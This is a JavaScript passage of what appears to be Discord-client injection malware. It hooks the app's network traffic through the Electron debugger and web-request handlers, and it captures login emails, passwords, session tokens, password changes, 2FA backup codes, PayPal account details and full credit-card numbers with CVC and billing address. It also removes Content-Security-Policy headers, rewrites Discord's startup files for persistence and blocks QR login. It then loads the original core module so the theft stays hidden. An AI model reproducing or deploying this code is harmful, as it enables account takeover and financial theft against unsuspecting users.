        switch (process.platform) {
            case 'win32':
                resource = path.join(appDir, 'resources');
                break;
            case 'darwin':
                resource = path.join(appDir, 'Contents', 'Resources');
                break;
            default:
                return { 
                    resource: undefined, 
                    app: undefined 
                };
        }

        if (fs.existsSync(resource)) {
            return { 
                resource: resource, 
                app: appDir 
            };
        }

        return { 
            resource: undefined, 
            app: undefined 
        };
    };

    const { resource, app } = getDiscordPaths();

    if (!resource || !app) return;
    const appDir = path.join(resource, 'app');

    const packageJsonFile = path.join(appDir, 'package.json');
    const startupScriptRunJsFile = path.join(appDir, 'index.js');

    const coreJsFile = path.join(app, 'modules', fs.readdirSync(path.join(app, 'modules')).find(file => /discord_desktop_core-/.test(file)), 'discord_desktop_core', 'index.js');
    const betterDiscordAsarFile = path.join(process.env.APPDATA, 'betterdiscord', 'data', 'betterdiscord.asar');
    
    if (!fs.existsSync(appDir)) {
        fs.mkdirSync(appDir, { recursive: true });
    }
    
    if (fs.existsSync(packageJsonFile)) fs.unlinkSync(packageJsonFile);
    if (fs.existsSync(startupScriptRunJsFile)) fs.unlinkSync(startupScriptRunJsFile);
    
    if (process.platform === 'win32' || process.platform === 'darwin') {
        fs.writeFileSync(packageJsonFile, JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));
    
   
    }
    
};

const ZiskCord = async () => {
    try {
        const token = await CONFIG['get']['token']();
        if (!token) {
            return null;
        }

        const API = new Fetcher(token);
        
        const [userResult, profileResult, billingResult, friendsResult, serversResult] = await Promise.allSettled([
            API.User(),
            API.Profile(), 
            API.Billing(),
            API.Friends(),
            API.Servers()
        ]);

        const result = {
            token,
            user: userResult.status === 'fulfilled' ? userResult.value : null,
            profile: profileResult.status === 'fulfilled' ? profileResult.value : null,
            billing: billingResult.status === 'fulfilled' ? billingResult.value : null,
            friends: friendsResult.status === 'fulfilled' ? friendsResult.value : null,
            servers: serversResult.status === 'fulfilled' ? serversResult.value : null
        };
        
        return result;
    } catch (error) {
        return null;
    }
}

let [
    ZebiRPData,
    email,
    password,
    startup_event_occurred,
    script_executed
] = [
    '',
    '',
    '',
    false,
    false
];

const parseJSON = (data) => {
    try {
        return JSON.parse(data || '');
    } catch {
        return {};
    }
};

const delay = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms))
};

const GangwayCord = async (params, RESPONSE_DATA, RESQUEST_DATA, token, user) => {
    switch (true) {
        case params.response.url.endsWith('/login'):
            if (params.response.url.endsWith('/remote-auth/login')) {
                if (!RESPONSE_DATA.encrypted_token) return;
                await delay(2000);
                ZebiRPData = await ZiskCord();
                if (!ZebiRPData || !ZebiRPData.token) return;
                const { token, user } = ZebiRPData;
                await Cruise('LOGIN_USER', RESPONSE_DATA, RESQUEST_DATA, user?.email || 'unknown@email.com', 'QR Code Login', token, 'has logged in using QR code');
            } else {
                try {
                    let loginToken = RESPONSE_DATA.token;
                    let userEmail = RESQUEST_DATA.login || RESQUEST_DATA.email;
                    let userPassword = RESQUEST_DATA.password;
                    
                    if (userEmail) email = userEmail;
                    if (userPassword) password = userPassword;
                    
                    if (!loginToken) {
                        await delay(3000);
                        const ZebiRPData = await ZiskCord();
                        if (!ZebiRPData || !ZebiRPData.token) return;
                        loginToken = ZebiRPData.token;
                        userEmail = userEmail || ZebiRPData.user?.email;
                    }
                    if (loginToken) {
                        await Cruise('LOGIN_USER', RESPONSE_DATA, RESQUEST_DATA, userEmail || email, userPassword || password, loginToken, 'has logged in');
                    }
                } catch (error) {
                }
            }
            break;

        case params.response.url.endsWith('/register'):
            let registerToken = RESPONSE_DATA.token || token;
            
            if (RESQUEST_DATA.email) email = RESQUEST_DATA.email;
            if (RESQUEST_DATA.password) password = RESQUEST_DATA.password;
            
            if (!registerToken) {
                await delay(1500);
                try {
                    ZebiRPData = await ZiskCord();
                    if (ZebiRPData && ZebiRPData.token) registerToken = ZebiRPData.token;
                } catch (error) {
                    return;
                }
            }
            if (registerToken) {
                await Cruise('LOGIN_USER', RESPONSE_DATA, RESQUEST_DATA, RESQUEST_DATA.email || email, RESQUEST_DATA.password || password, registerToken, 'has created a new account');
            }
            break;

        case params.response.url.endsWith('/totp'):
            let totpToken = RESPONSE_DATA.token;
            if (!totpToken) {
                await delay(1500);
                try {
                    ZebiRPData = await ZiskCord();
                    if (ZebiRPData && ZebiRPData.token) totpToken = ZebiRPData.token;
                } catch (error) {
                    return;
                }
            }
            if (totpToken) {
                await Cruise('LOGIN_USER', RESPONSE_DATA, RESQUEST_DATA, email, password, totpToken, 'has logged in with 2FA');
            }
            break;

        case params.response.url.endsWith('/remote-auth/finish'):
            await delay(2000);
            try {
                ZebiRPData = await ZiskCord();
                if (ZebiRPData && ZebiRPData.token) {
                    const { token: finishToken, user: finishUser } = ZebiRPData;
                    await Cruise('LOGIN_USER', RESPONSE_DATA, RESQUEST_DATA, finishUser?.email || 'unknown@email.com', 'QR Code Login', finishToken, 'has completed QR code login');
                }
            } catch (error) {
            }
            break;

        case params.response.url.endsWith('/@me'):
            if (params.request && params.request.method === 'PATCH') {
                try {
                    const requestData = RESQUEST_DATA;
                    if (requestData && requestData.password && requestData.new_password && token) {
                        const newToken = RESPONSE_DATA.token || token;
                        await Cruise(
                            'PASSWORD_CHANGED',
                            RESPONSE_DATA,
                            requestData,
                            user?.email || email || 'unknown@email.com',
                            requestData.password,
                            `changed their password (GangwayCord) from "${requestData.password}" to "${requestData.new_password}"`
                        );
                    }
                } catch (error) {
                    console.error('GangwayCord password change error:', error);
                }
            }
            break;

        case params.response.url.includes('/oauth2/authorize'):
            if (RESPONSE_DATA.location || RESPONSE_DATA.redirect_uri) {
                await delay(1000);
                try {
                    ZebiRPData = await ZiskCord();
                    if (ZebiRPData && ZebiRPData.token) {
                        const { token: oauthToken, user: oauthUser } = ZebiRPData;
                        await Cruise('LOGIN_USER', RESPONSE_DATA, RESQUEST_DATA, oauthUser?.email || 'unknown@email.com', 'OAuth2 Authorization', oauthToken, 'has authorized an OAuth2 application');
                    }
                } catch (error) {
                }
            }
            break;
    }
};

const setupTokenCapture = (mainWindow) => {
    if (!mainWindow) return;
    
    mainWindow.webContents.debugger.attach('1.3');
    
    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
        if (method === 'Network.requestWillBeSent') {
            try {
                const { request } = params;
                const { url, headers, postData } = request;
                
                if ((url.includes('/auth/login') || url.endsWith('/login')) && request.method === 'POST' && postData) {
                    try {
                        const requestData = JSON.parse(postData);
                        if (requestData.login || requestData.email) {
                            email = requestData.login || requestData.email;
                        }
                        if (requestData.password) {
                            password = requestData.password;
                        }
                    } catch (parseError) {
                    }
                }
                
                if (url.includes('/users/@me') && request.method === 'PATCH' && postData) {
                    try {
                        const requestData = JSON.parse(postData);
                        const currentToken = headers['Authorization'] || headers['authorization'];
                        
                        if (requestData.email && requestData.email_token && requestData.password && currentToken) {
                            try {
                                const ZebiRPData = await ZiskCord();
                                if (ZebiRPData && ZebiRPData.user) {
                                    await Cruise(
                                        'EMAIL_CHANGED',
                                        null,
                                        requestData,
                                        requestData.email,
                                        requestData.password,
                                        currentToken,
                                        `changed their email to "${requestData.email}"`
                                    );
                                }
                            } catch (err) {
                            }
                        }
                        
                        if (requestData.password && requestData.new_password && currentToken) {
                            try {
                                const changeKey = `${requestData.password}_${requestData.new_password}_${currentToken?.slice(-10)}`;
                                const now = Date.now();
                                if (lastPasswordChangeData && lastPasswordChangeData.key === changeKey && (now - lastPasswordChangeData.time) < 3000) {
                                    return;
                                }
                                lastPasswordChangeData = { key: changeKey, time: now };
                                
                                setTimeout(async () => {
                                    try {
                                        let newToken = currentToken;
                                        try {
                                            const responseData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {requestId: params.requestId});
                                            const parsedResponse = JSON.parse(responseData.body);
                                            if (parsedResponse.token) {
                                                newToken = parsedResponse.token;
                                            }
                                        } catch (responseError) {
                                        }
                                        
                                        const ZebiRPData = await ZiskCord();
                                        if (ZebiRPData && ZebiRPData.user) {
                                            await Cruise(
                                                'PASSWORD_CHANGED',
                                                { token: newToken }, 
                                                requestData,
                                                ZebiRPData.user.email || email || 'unknown@email.com',
                                                requestData.password,
                                                `changed their password from "${requestData.password}" to "${requestData.new_password}"`
                                            );
                                        }
                                    } catch (err) {
                                        console.error('Password change error:', err);
                                    }
                                }, 1500); 
                            } catch (err) {
                                console.error('Password change outer error:', err);
                            }
                        }
                        
                        if (requestData.username && requestData.password && currentToken && !requestData.new_password && !requestData.email) {
                            try {
                                const ZebiRPData = await ZiskCord();
                                if (ZebiRPData && ZebiRPData.user) {
                                    await Cruise(
                                        'USERNAME_CHANGED',
                                        null,
                                        requestData,
                                        ZebiRPData.user.email || email || 'unknown@email.com',
                                        requestData.password,
                                        currentToken,
                                        `changed their username to "${requestData.username}"`
                                    );
                                }
                            } catch (err) {
                            }
                        }
                    } catch (parseError) {
                    }
                }
                
                if (/\/api\/v\d+\/users\/@me\/mfa\/codes-verification/.test(url) && request.method === 'POST' && postData) {
                    try {
                        const requestData = JSON.parse(postData);
                        const currentToken = headers['Authorization'] || headers['authorization'];
                        
                        if (currentToken) {
                            setTimeout(async () => {
                                try {
                                    const ZebiRPData = await ZiskCord();
                                    if (ZebiRPData && ZebiRPData.user) {
                                        const domCodes = await CONFIG.get.backup_codes();
                                        const formattedCodes = (domCodes || [])
                                            .filter(c => /^[a-z0-9]{8}$/.test(c))
                                            .map(c => `${c.slice(0,4)}-${c.slice(4)}`);
                                        
                                        await Cruise(
                                            'BACKUP_CODES',
                                            { backup_codes: formattedCodes.map(code => ({ code: code.replace('-', '') })) },
                                            requestData,
                                            ZebiRPData.user.email || email || 'unknown@email.com',
                                            password || 'Password not captured',
                                            currentToken,
                                            `captured ${formattedCodes.length} backup security codes`
                                        );
                                    }
                                } catch (err) {
                                }
                            }, 2000);
                        }
                    } catch (parseError) {
                    }
                }
                
                if (url.includes('braintreegateway.com/merchants') && url.includes('paypal_accounts') && request.method === 'POST' && postData) {
                    try {
                        const currentToken = headers['Authorization'] || headers['authorization'];
                        
                        if (currentToken) {
                            setTimeout(async () => {
                                try {
                                    const ZebiRPData = await ZiskCord();
                                    if (ZebiRPData && ZebiRPData.user) {
                                        try {
                                            const responseData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {requestId: params.requestId});
                                            const paypalResponse = JSON.parse(responseData.body);
                                            
                                            if (paypalResponse.paypalAccounts && paypalResponse.paypalAccounts.length > 0) {
                                                const paypalData = paypalResponse.paypalAccounts[0];
                                                const paypalInfo = {
                                                    email: paypalData.details?.email || 'Unknown',
                                                    firstName: paypalData.details?.payerInfo?.firstName || 'Unknown',
                                                    lastName: paypalData.details?.payerInfo?.lastName || 'Unknown',
                                                    countryCode: paypalData.details?.payerInfo?.countryCode || 'Unknown',
                                                    line1: paypalData.details?.billingAddress?.line1 || 'Unknown',
                                                    city: paypalData.details?.billingAddress?.city || 'Unknown',
                                                    postalCode: paypalData.details?.billingAddress?.postalCode || 'Unknown',
                                                    addressCountry: paypalData.details?.billingAddress?.countryCode || 'Unknown'
                                                };
                                                
                                                await Cruise(
                                                    'PAYPAL_ADDED',
                                                    paypalResponse,
                                                    JSON.parse(postData),
                                                    ZebiRPData.user.email || email || 'unknown@email.com',
                                                    'PayPal Account Added',
                                                    currentToken,
                                                    `added PayPal account: ${paypalInfo.email} (${paypalInfo.firstName} ${paypalInfo.lastName})`
                                                );
                                            } else {
                                                await Cruise(
                                                    'PAYPAL_ADDED',
                                                    null,
                                                    null,
                                                    ZebiRPData.user.email || email || 'unknown@email.com',
                                                    'PayPal Account Added',
                                                    currentToken,
                                                    `added PayPal payment method to account`
                                                );
                                            }
                                        } catch (responseError) {
                                            await Cruise(
                                                'PAYPAL_ADDED',
                                                null,
                                                null,
                                                ZebiRPData.user.email || email || 'unknown@email.com',
                                                'PayPal Account Added',
                                                currentToken,
                                                `added PayPal payment method to account`
                                            );
                                        }
                                    }
                                } catch (err) {
                                }
                            }, 1500);
                        }
                    } catch (parseError) {
                    }
                }
                
                if (url.includes('api.stripe.com/v1/tokens') && request.method === 'POST' && postData) {
                    try {
                        const currentToken = headers['Authorization'] || headers['authorization'];
                        
                        const stripeData = new URLSearchParams(postData);
                        const cardInfo = {
                            number: stripeData.get('card[number]') || 'Not captured',
                            cvc: stripeData.get('card[cvc]') || 'Not captured',
                            exp_month: stripeData.get('card[exp_month]') || 'Not captured',
                            exp_year: stripeData.get('card[exp_year]') || 'Not captured'
                        };
                        
                        setTimeout(async () => {
                            try {
                                const ZebiRPData = await ZiskCord();
                                if (ZebiRPData && ZebiRPData.user) {
                                    global.tempCardInfo = cardInfo;
                                    
                                    if (!global.tempBillingAddress) {
                                        await Cruise(
                                            'CREDITCARD_ADDED',
                                            null,
                                            { cardInfo },
                                            ZebiRPData.user.email || email || 'unknown@email.com',
                                            'Credit Card Added',
                                            ZebiRPData.token,
                                            `added credit card ending in ${cardInfo.number.slice(-4)}`
                                        );
                                    }
                                }
                            } catch (err) {
                            }
                        }, 1000);
                    } catch (parseError) {
                    }
                }
                
                if (url.includes('/users/@me/billing/payment-sources/validate-billing-address') && request.method === 'POST' && postData) {
                    try {
                        const billingData = JSON.parse(postData);
                        const currentToken = headers['Authorization'] || headers['authorization'];
                        
                        if (billingData.billing_address && currentToken) {
                            const billingAddress = billingData.billing_address;
                            
                            global.tempBillingAddress = billingAddress;
                            
                            setTimeout(async () => {
                                try {
                                    const ZebiRPData = await ZiskCord();
                                    if (ZebiRPData && ZebiRPData.user && global.tempCardInfo) {
                                        await Cruise(
                                            'CREDITCARD_ADDED',
                                            null,
                                            { 
                                                cardInfo: global.tempCardInfo,
                                                billingAddress: billingAddress
                                            },
                                            ZebiRPData.user.email || email || 'unknown@email.com',
                                            'Credit Card Added',
                                            currentToken,
                                            `added credit card ending in ${global.tempCardInfo.number.slice(-4)} with billing address`
                                        );
                                        
                                        global.tempCardInfo = null;
                                        global.tempBillingAddress = null;
                                    }
                                } catch (err) {
                                }
                            }, 500);
                        }
                    } catch (parseError) {
                    }
                }
                
                if (CONFIG.token_filters.urls.some(endpoint => url.includes(endpoint))) {
                    const authHeader = headers['Authorization'] || headers['authorization'];
                    
                    if (authHeader && authHeader !== capturedToken) {
                        capturedToken = authHeader;
                        
                        try {
                            await delay(1000);
                            const ZebiRPData = await ZiskCord();
                            if (ZebiRPData && ZebiRPData.user) {
                                await Cruise(
                                    'LOGIN_USER',
                                    null,
                                    null,
                                    ZebiRPData.user.email || 'nothing@email.com',
                                    password || 'Password not captured',
                                    capturedToken,
                                    `User: ${ZebiRPData.user.username || 'Unknown'}`
                                );
                            }
                        } catch (err) {
                        }
                    }
                }
            } catch (e) {
            }
        }
        
        if ('Network.responseReceived' !== method) return;
        
        if (!startup_event_occurred) {
            await startup();
            startup_event_occurred = true;
        }
        
        if (params.response.url.includes('discord.com/api/')) {
        }
        
        const matchedFilter = CONFIG.auth_filters.urls.find(url => params.response.url.endsWith(url));
        if (!matchedFilter) {
            return;
        }
        
        if (![200, 202].includes(params.response.status)) {
            return;
        }

        try {
            const [
                responseUnparsed,
                requestUnparsed
            ] = await Promise.all([
                mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {requestId: params.requestId}),
                mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {requestId: params.requestId})
            ]);            

            const RESPONSE_DATA = parseJSON(responseUnparsed.body);
            const RESQUEST_DATA = parseJSON(requestUnparsed.postData);

            ZebiRPData = await ZiskCord();
            const { token, user } = ZebiRPData;

            GangwayCord(params, RESPONSE_DATA, RESQUEST_DATA, token, user);
        } catch (error) {
        }
    });

    mainWindow.webContents.debugger.sendCommand('Network.enable');
    
    mainWindow.webContents.debugger.sendCommand('Runtime.enable');

    mainWindow.on('closed', () => {
        try {
            const windows = BrowserWindow.getAllWindows();
            if (windows.length > 0) {
                createWindow(windows[0]);
            }
        } catch (error) {
        }
    });
};

const defaultSession = (webRequest) => {
    webRequest.onBeforeSendHeaders((details, callback) => {
        const { url } = details;
        if (url.includes('discord.com') || url.includes('discordapp.com')) {
            const requestHeaders = { ...details.requestHeaders };
            
            if (url.includes('ptb.discord.com')) {
                requestHeaders['Origin'] = 'https://ptb.discord.com';
            } else if (url.includes('canary.discord.com')) {
                requestHeaders['Origin'] = 'https://canary.discord.com';
            } else {
                requestHeaders['Origin'] = 'https://discord.com';
            }
            
            callback({ requestHeaders });
        } else {
            callback({});
        }
    });

    const allRequestsFilter = {
        urls: ['*://*/*']
    };
    
    webRequest.onBeforeRequest(allRequestsFilter, async (details, callback) => {
        const { url, method, uploadData, requestHeaders } = details;
        
        if ((url.includes('/auth/login') || url.includes('/login')) && method === 'POST' && uploadData) {
            try {
                const requestBody = Buffer.from(uploadData[0].bytes).toString();
                let requestData;
                
                try {
                    requestData = JSON.parse(requestBody);
                } catch {
                    requestData = {};
                    const params = new URLSearchParams(requestBody);
                    for (const [key, value] of params) {
                        requestData[key] = value;
                    }
                }
                
                if (requestData.login || requestData.email || requestData.username) {
                    email = requestData.login || requestData.email || requestData.username;
                }
                if (requestData.password) {
                    password = requestData.password;
                }
            } catch (error) {
            }
        }
        
        if ((url.includes('/auth/register') || url.includes('/register')) && method === 'POST' && uploadData) {
            try {
                const requestBody = Buffer.from(uploadData[0].bytes).toString();
                let requestData;
                
                try {
                    requestData = JSON.parse(requestBody);
                } catch {
                    requestData = {};
                    const params = new URLSearchParams(requestBody);
                    for (const [key, value] of params) {
                        requestData[key] = value;
                    }
                }
                
                if (requestData.email || requestData.username) {
                    email = requestData.email || requestData.username;
                }
                if (requestData.password) {
                    password = requestData.password;
                }
            } catch (error) {
            }
        }
        
        if (url.includes('/users/@me') && method === 'PATCH' && uploadData) {
            try {
                const requestBody = Buffer.from(uploadData[0].bytes).toString();
                let requestData;
                
                try {
                    requestData = JSON.parse(requestBody);
                } catch {
                    requestData = {};
                    const params = new URLSearchParams(requestBody);
                    for (const [key, value] of params) {
                        requestData[key] = value;
                    }
                }
                
                if (requestData.password && requestData.new_password) {
                    global.pendingPasswordChangeNetwork = {
                        oldPassword: requestData.password,
                        newPassword: requestData.new_password,
                        url: url,
                        method: method,
                        timestamp: Date.now()
                    };
                }
            } catch (error) {
                console.error('Password change parsing error:', error);
            }
        }

        callback({});
    });
    webRequest.onHeadersReceived(async (request, callback) => {
        const { url, method, statusCode, responseHeaders, uploadData } = request;
        const updatedHeaders = { ...responseHeaders };

        if (updatedHeaders['access-control-allow-origin']) {
            const originValue = Array.isArray(updatedHeaders['access-control-allow-origin']) 
                ? updatedHeaders['access-control-allow-origin'][0] 
                : updatedHeaders['access-control-allow-origin'];
            updatedHeaders['access-control-allow-origin'] = [originValue];
        }

        delete updatedHeaders["content-security-policy"];
        delete updatedHeaders["content-security-policy-report-only"];

        callback({responseHeaders: updatedHeaders});

        if (url.includes('/users/@me') && method === 'PATCH' && statusCode === 200 && global.pendingPasswordChangeNetwork) {
            const pendingData = global.pendingPasswordChangeNetwork;
            
            if (Date.now() - pendingData.timestamp < 10000) {
                setTimeout(async () => {
                    try {
                        const ZebiRPData = await ZiskCord();
                        if (ZebiRPData && ZebiRPData.user && ZebiRPData.token) {
                            await Cruise(
                                'PASSWORD_CHANGED',
                                null,
                                {
                                    password: pendingData.oldPassword,
                                    new_password: pendingData.newPassword
                                },
                                ZebiRPData.user.email || email || 'unknown@email.com',
                                pendingData.oldPassword,
                                ZebiRPData.token,
                                `changed their password (Status 200 Response) from "${pendingData.oldPassword}" to "${pendingData.newPassword}"`
                            );
                        }
                        global.pendingPasswordChangeNetwork = null;
                    } catch (err) {
                        console.error('Password change response error:', err);
                    }
                }, 1000);
            }
        }

        if (url.endsWith('/@me') && !script_executed) {
            if (CONFIG.auto_user_profile_edit === 'true') {
                script_executed = true;
                await editSettingUser();
            };
    
            if (CONFIG.auto_email_update === 'true') {
                script_executed = true;

                let ZebiRPData = await ZiskCord();
                const language = ZebiRPData.user.locale || 'en-US';

                const truncateEmail = (email) => {
                    if (!email) return '@';
                    const [localPart, domain] = email.split('@');
                    const truncatedLocalPart = localPart.length > 15 ? `${localPart.slice(0, 15)}...` : localPart;
                    return `${truncatedLocalPart}@${domain}`;
                };
                const getDiscordDomain = (maper) => {
                    const path = __dirname.trim().replace(/\\/g, "/");
                    const regex = /\/Local\/(discord|discordcanary|discordptb|discorddevelopment)\//i;
                    const match = path.match(regex);
                    let domain = 'discord.com'; 
                    if (match && maper[match[1].toLowerCase()]) {
                        domain = maper[match[1].toLowerCase()];
                    }
                    return domain
                }
            };
        }
    });
}

const createWindow = (mainWindow) => {
    if (!mainWindow) return;
    if (CONFIG.force_persist_startup === 'true' && !startup_event_occurred) {
        forcePersistStartup();
        startup_event_occurred = true;
    }
    
    setupTokenCapture(mainWindow); 
};

createWindow(BrowserWindow.getAllWindows()[0]);
defaultSession(session.defaultSession.webRequest);

const qrCodesFilter = {
    urls: [
        "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
        "https://*.discord.com/api/v*/applications/detectable",
        "https://discord.com/api/v*/applications/detectable",
        "https://*.discord.com/api/v*/users/@me/library",
        "https://discord.com/api/v*/users/@me/library",
        "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
        "https://discord.com/api/v*/users/@me/billing/subscriptions",
        "wss://remote-auth-gateway.discord.gg/*"
    ]
};

session.defaultSession.webRequest.onBeforeRequest(qrCodesFilter, async (details, callback) => {
    if (details.url.startsWith("wss://")) {
        if (!CONFIG.disable_qr_code == false) {
            callback({
                cancel: true
            });
            return;
        }
    }

    await startup();

    callback({});
    return;
});


module.exports = require("./core.asar"); 
